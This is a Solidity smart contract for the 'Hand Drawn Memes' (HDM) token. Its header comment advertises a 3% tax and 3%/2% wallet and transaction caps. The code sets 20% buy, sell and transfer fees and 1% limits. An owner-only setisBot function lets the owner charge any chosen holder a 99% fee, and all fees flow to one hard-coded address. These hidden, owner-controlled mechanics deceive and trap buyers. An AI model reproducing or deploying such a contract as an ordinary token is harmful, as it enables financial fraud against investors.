1 /**
2 ooooo   ooooo oooooooooo.   ooo        ooooo 
3 `888'   `888' `888'   `Y8b  `88.       .888' 
4  888     888   888      888  888b     d'888  
5  888ooooo888   888      888  8 Y88. .P  888  
6  888     888   888      888  8  `888'   888  
7  888     888   888     d88'  8    Y     888  
8 o888o   o888o o888bood8P'   o8o        o888o 
9                                         
10 Hand Drawn Memes (HDM)
11 TG: https://t.me/HandDrawnMemes
12 Twitter: https://twitter.com/handdrawnmeme
13 Website: https://hdmtoken.com
14 
15 Supply: 100,000,000
16 Max Wallet: 3% - 3,000,000
17 Max TXN: 2% - 2,000,000
18 Tax: 3% Buy / 3% Sell
19 */
20 
21 // SPDX-License-Identifier: MIT
22 
23 pragma solidity 0.8.16;
24 
25 
26 library SafeMath {
27     function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
28     function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
29     function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
30     function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
31     function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
32     
33     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
34         unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
35 
36     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
37         unchecked {if(b > a) return(false, 0); return(true, a - b);}}
38 
39     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
40         unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
41         if(c / a != b) return(false, 0); return(true, c);}}
42 
43     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
44         unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
45 
46     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
47         unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
48 
49     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
50         unchecked{require(b <= a, errorMessage); return a - b;}}
51 
52     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
53         unchecked{require(b > 0, errorMessage); return a / b;}}
54 
55     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
56         unchecked{require(b > 0, errorMessage); return a % b;}}}
57 
58 interface IERC20 {
59     function totalSupply() external view returns (uint256);
60     function circulatingSupply() external view returns (uint256);
61     function decimals() external view returns (uint8);
62     function symbol() external view returns (string memory);
63     function name() external view returns (string memory);
64     function getOwner() external view returns (address);
65     function balanceOf(address account) external view returns (uint256);
66     function transfer(address recipient, uint256 amount) external returns (bool);
67     function allowance(address _owner, address spender) external view returns (uint256);
68     function approve(address spender, uint256 amount) external returns (bool);
69     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
70     event Transfer(address indexed from, address indexed to, uint256 value);
71     event Approval(address indexed owner, address indexed spender, uint256 value);}
72 
73 abstract contract Ownable {
74     address internal owner;
75     constructor(address _owner) {owner = _owner;}
76     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
77     function isOwner(address account) public view returns (bool) {return account == owner;}
78     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
79     event OwnershipTransferred(address owner);
80 }
81 
82 interface IFactory{
83         function createPair(address tokenA, address tokenB) external returns (address pair);
84         function getPair(address tokenA, address tokenB) external view returns (address pair);
85 }
86 
87 interface IRouter {
88     function factory() external pure returns (address);
89     function WETH() external pure returns (address);
90     function addLiquidityETH(
91         address token,
92         uint amountTokenDesired,
93         uint amountTokenMin,
94         uint amountETHMin,
95         address to,
96         uint deadline
97     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
98 
99     function removeLiquidityWithPermit(
100         address tokenA,
101         address tokenB,
102         uint liquidity,
103         uint amountAMin,
104         uint amountBMin,
105         address to,
106         uint deadline,
107         bool approveMax, uint8 v, bytes32 r, bytes32 s
108     ) external returns (uint amountA, uint amountB);
109 
110     function swapExactETHForTokensSupportingFeeOnTransferTokens(
111         uint amountOutMin,
112         address[] calldata path,
113         address to,
114         uint deadline
115     ) external payable;
116 
117     function swapExactTokensForETHSupportingFeeOnTransferTokens(
118         uint amountIn,
119         uint amountOutMin,
120         address[] calldata path,
121         address to,
122         uint deadline) external;
123 }
124 
125 contract Hdm is IERC20, Ownable {
126     using SafeMath for uint256;
127     string private constant _name = 'Hand Drawn Memes';
128     string private constant _symbol = 'HDM';
129     uint8 private constant _decimals = 9;
130     uint256 private _totalSupply = 100000000 * (10 ** _decimals);
131     uint256 private _maxTxAmountPercent = 100; // 10000;
132     uint256 private _maxTransferPercent = 100;
133     uint256 private _maxWalletPercent = 100;
134     mapping (address => uint256) _balances;
135     mapping (address => mapping (address => uint256)) private _allowances;
136     mapping (address => bool) public isFeeExempt;
137     mapping (address => bool) private isBot;
138     IRouter router;
139     address public pair;
140     bool private tradingAllowed = false;
141     uint256 private liquidityFee = 0;
142     uint256 private marketingFee = 300;
143     uint256 private developmentFee = 200;
144     uint256 private burnFee = 0;
145     uint256 private totalFee = 2000;
146     uint256 private sellFee = 2000;
147     uint256 private transferFee = 2000;
148     uint256 private denominator = 10000;
149     bool private swapEnabled = true;
150     uint256 private swapTimes;
151     bool private swapping; 
152     uint256 private swapThreshold = ( _totalSupply * 300 ) / 100000;
153     uint256 private _minTokenAmount = ( _totalSupply * 10 ) / 100000;
154     modifier lockTheSwap {swapping = true; _; swapping = false;}
155 
156     address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
157     address internal constant development_receiver = 0x0040dF36338CEB014A37fc574A2D08FdcB7f49cA; 
158     address internal constant marketing_receiver = 0x0040dF36338CEB014A37fc574A2D08FdcB7f49cA;
159     address internal constant liquidity_receiver = 0x0040dF36338CEB014A37fc574A2D08FdcB7f49cA;
160 
161     constructor() Ownable(msg.sender) {
162         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
163         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
164         router = _router;
165         pair = _pair;
166         isFeeExempt[address(this)] = true;
167         isFeeExempt[liquidity_receiver] = true;
168         isFeeExempt[marketing_receiver] = true;
169         isFeeExempt[msg.sender] = true;
170         _balances[msg.sender] = _totalSupply;
171         emit Transfer(address(0), msg.sender, _totalSupply);
172     }
173 
174     receive() external payable {}
175     function name() public pure returns (string memory) {return _name;}
176     function symbol() public pure returns (string memory) {return _symbol;}
177     function decimals() public pure returns (uint8) {return _decimals;}
178     function startTrading() external onlyOwner {tradingAllowed = true;}
179     function getOwner() external view override returns (address) { return owner; }
180     function totalSupply() public view override returns (uint256) {return _totalSupply;}
181     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
182     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
183     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
184     function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
185     function setisBot(address _address, bool _enabled) external onlyOwner {isBot[_address] = _enabled;}
186     function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
187     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
188     function circulatingSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
189     function _maxWalletToken() public view returns (uint256) {return totalSupply() * _maxWalletPercent / denominator;}
190     function _maxTxAmount() public view returns (uint256) {return totalSupply() * _maxTxAmountPercent / denominator;}
191     function _maxTransferAmount() public view returns (uint256) {return totalSupply() * _maxTransferPercent / denominator;}
192 
193     function preTxCheck(address sender, address recipient, uint256 amount) internal view {
194         require(sender != address(0), "ERC20: transfer from the zero address");
195         require(recipient != address(0), "ERC20: transfer to the zero address");
196         require(amount > uint256(0), "Transfer amount must be greater than zero");
197         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
198     }
199 
200     function _transfer(address sender, address recipient, uint256 amount) private {
201         preTxCheck(sender, recipient, amount);
202         checkTradingAllowed(sender, recipient);
203         checkMaxWallet(sender, recipient, amount); 
204         swapbackCounters(sender, recipient);
205         checkTxLimit(sender, recipient, amount); 
206         swapBack(sender, recipient, amount);
207         _balances[sender] = _balances[sender].sub(amount);
208         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
209         _balances[recipient] = _balances[recipient].add(amountReceived);
210         emit Transfer(sender, recipient, amountReceived);
211     }
212 
213     function setStructure(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
214         liquidityFee = _liquidity;
215         marketingFee = _marketing;
216         burnFee = _burn;
217         developmentFee = _development;
218         totalFee = _total;
219         sellFee = _sell;
220         transferFee = _trans;
221         require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
222     }
223 
224     function setParameters(uint256 _buy, uint256 _trans, uint256 _wallet) external onlyOwner {
225         uint256 newTx = (totalSupply() * _buy) / 10000;
226         uint256 newTransfer = (totalSupply() * _trans) / 10000;
227         uint256 newWallet = (totalSupply() * _wallet) / 10000;
228         _maxTxAmountPercent = _buy;
229         _maxTransferPercent = _trans;
230         _maxWalletPercent = _wallet;
231         uint256 limit = totalSupply().mul(5).div(1000);
232         require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
233     }
234 
235     function checkTradingAllowed(address sender, address recipient) internal view {
236         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
237     }
238     
239     function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
240         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
241             require((_balances[recipient].add(amount)) <= _maxWalletToken(), "Exceeds maximum wallet amount.");}
242     }
243 
244     function swapbackCounters(address sender, address recipient) internal {
245         if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
246     }
247 
248     function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
249         if(sender != pair){require(amount <= _maxTransferAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
250         require(amount <= _maxTxAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
251     }
252 
253     function swapAndLiquify(uint256 tokens) private lockTheSwap {
254         uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
255         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
256         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
257         uint256 initialBalance = address(this).balance;
258         swapTokensForETH(toSwap);
259         uint256 deltaBalance = address(this).balance.sub(initialBalance);
260         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
261         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
262         if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
263         uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
264         if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
265         uint256 remainingBalance = address(this).balance;
266         if(remainingBalance > uint256(0)){payable(development_receiver).transfer(remainingBalance);}
267     }
268 
269     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
270         _approve(address(this), address(router), tokenAmount);
271         router.addLiquidityETH{value: ETHAmount}(
272             address(this),
273             tokenAmount,
274             0,
275             0,
276             liquidity_receiver,
277             block.timestamp);
278     }
279 
280     function swapTokensForETH(uint256 tokenAmount) private {
281         address[] memory path = new address[](2);
282         path[0] = address(this);
283         path[1] = router.WETH();
284         _approve(address(this), address(router), tokenAmount);
285         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
286             tokenAmount,
287             0,
288             path,
289             address(this),
290             block.timestamp);
291     }
292 
293     function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
294         bool aboveMin = amount >= _minTokenAmount;
295         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
296         return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= uint256(0) && aboveThreshold;
297     }
298 
299     function swapBack(address sender, address recipient, uint256 amount) internal {
300         if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
301     }
302 
303     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
304         return !isFeeExempt[sender] && !isFeeExempt[recipient];
305     }
306 
307     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
308         if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
309         if(recipient == pair){return sellFee;}
310         if(sender == pair){return totalFee;}
311         return transferFee;
312     }
313 
314     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
315         if(getTotalFee(sender, recipient) > 0){
316         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
317         _balances[address(this)] = _balances[address(this)].add(feeAmount);
318         emit Transfer(sender, address(this), feeAmount);
319         if(burnFee > uint256(0)){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
320         return amount.sub(feeAmount);} return amount;
321     }
322 
323     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
324         _transfer(sender, recipient, amount);
325         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
326         return true;
327     }
328 
329     function _approve(address owner, address spender, uint256 amount) private {
330         require(owner != address(0), "ERC20: approve from the zero address");
331         require(spender != address(0), "ERC20: approve to the zero address");
332         _allowances[owner][spender] = amount;
333         emit Approval(owner, spender, amount);
334     }
335 
336 }